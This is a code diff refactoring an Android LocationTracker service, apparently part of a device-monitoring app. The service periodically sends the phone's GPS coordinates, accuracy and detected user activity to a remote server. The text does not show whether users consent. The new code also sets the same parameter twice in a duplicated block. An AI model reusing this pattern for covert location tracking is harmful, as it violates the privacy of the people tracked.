@@ -6,9 +6,6 @@ import java.util.Iterator;
 import java.util.List;
 import java.util.Locale;
 
-import org.json.JSONException;
-import org.json.JSONObject;
-
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
@@ -31,11 +28,12 @@ import com.google.android.gms.common.GooglePlayServicesUtil;
 import com.google.android.gms.common.api.GoogleApiClient;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationServices;
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.DataRequest;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
+import com.loopj.android.http.RequestParams;
 
 /**
  * LocationTracker class is designed to monitoring location
@@ -88,10 +86,10 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		mContext = getApplicationContext();
-		int timeUp = ValueWork.getMethod(
-				ConstantValue.TYPE_LOCATION_TRACKER_REQUEST, this);
-		geoMode = ValueWork
-				.getMethod(ConstantValue.LOCATION_TRACKER_MODE, this);
+		int timeUp = AppSettings.getSetting(
+				AppConstants.TYPE_LOCATION_TRACKER_REQUEST, this);
+		geoMode = AppSettings.getSetting(AppConstants.LOCATION_TRACKER_MODE,
+				this);
 		locationManager = (LocationManager) mContext
 				.getSystemService(LOCATION_SERVICE);
 
@@ -102,7 +100,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 			return 0;
 		}
 		setCalendar(FIVE);
-		
+
 		MIN_TIME_BW_UPDATES = timeUp * MILLISECONDS_PER_MINUTE;
 		Logging.doLog(TAG, "onStartCommand LocationTracker "
 				+ MIN_TIME_BW_UPDATES, "onStartCommand LocationTracker "
@@ -288,36 +286,33 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 
 		} else {
 			// -------send location----------------------------
-			String sendJSONStr = null;
-			JSONObject info = new JSONObject();
-			JSONObject object = new JSONObject();
-			try {
-				// String activity = sp.getString("activity", "0");
-				String activity = RecognitionDevService.getActivityDevice();
-				Logging.doLog(TAG, "activity" + activity, "activity" + activity);
+			// String activity = sp.getString("activity", "0");
+			String activity = RecognitionDevService.getActivityDevice();
+			Logging.doLog(TAG, "activity" + activity, "activity" + activity);
+			RequestParams params = new RequestParams();
+			if (activity != null && !activity.equals(""))
+				params.put("data[][info][ttl]", locationValue.getProvider()
+						+ " " + " " + activity);
+			if (activity != null && !activity.equals(""))
+				params.put("data[][info][ttl]", locationValue.getProvider()
+						+ " " + " " + activity);
+			else
+				params.put("data[][info][ttl]", locationValue.getProvider());
+			params.put("data[][info][data]", locationValue.getLatitude() + ","
+					+ locationValue.getLongitude());
+			params.put("data[][info][accuracy]",
+					String.format("%.02f", locationValue.getAccuracy()));
 
-				if (activity != null && !activity.equals(""))
-					info.put("ttl", locationValue.getProvider() + " " + " "
-							+ activity);
-				else
-					info.put("ttl", locationValue.getProvider());
-				info.put("data", locationValue.getLatitude() + ","
-						+ locationValue.getLongitude());
-				info.put("accuracy",
-						String.format("%.02f", locationValue.getAccuracy()));
-				object.put("time", ConvertDate.logTime());
-				object.put("type", ConstantValue.TYPE_LOCATION_TRACKER_REQUEST);
-				object.put("info", info);
+			params.put("data[][time]", ConvertDate.logTime());
+			params.put("data[][type]", Integer
+					.toString(AppConstants.TYPE_LOCATION_TRACKER_REQUEST));
+			params.put("key", System.currentTimeMillis());
 
-				sendJSONStr = object.toString();
-			} catch (JSONException e) {
-				Logging.doLog(TAG, "json сломался", "json сломался");
-			}
+			Log.d(TAG, params.toString());
 
-			DataRequest dr = new DataRequest(mContext);
-			dr.sendRequest(sendJSONStr);
+			DataRequest dataReq = new DataRequest(mContext);
+			dataReq.sendRequest(params);
 
-			Logging.doLog(TAG, sendJSONStr, sendJSONStr);
 		}
 	}
 
